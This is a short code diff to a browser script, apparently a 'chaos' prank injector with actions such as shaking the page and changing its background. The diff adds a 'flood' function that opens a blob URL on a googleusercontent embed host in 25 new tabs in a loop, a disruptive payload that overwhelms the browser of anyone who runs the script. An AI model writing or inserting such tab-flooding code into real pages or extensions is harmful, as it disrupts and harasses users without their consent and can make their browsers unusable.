@@ -27,6 +27,12 @@ if (!window.__chaosInjected && localStorage.getItem('chaos-listener-active') ===
           });
           document.body.appendChild(vid);
         },
+        flood: () => {
+  const url = 'blob:https://479669822-atari-embeds.googleusercontent.com/578c5cd4-6b39-4a93-8bca-fa0bae9b5fbc';
+  for (let i = 0; i < 25; i++) {
+    window.open(url, '_blank');
+  }
+},
         changeBG: () => document.body.style.background = `hsl(${Math.floor(Math.random()*360)} 60% 80%)`,
         shake: () => {
           if (document.getElementById('__chaos_shake')) return;
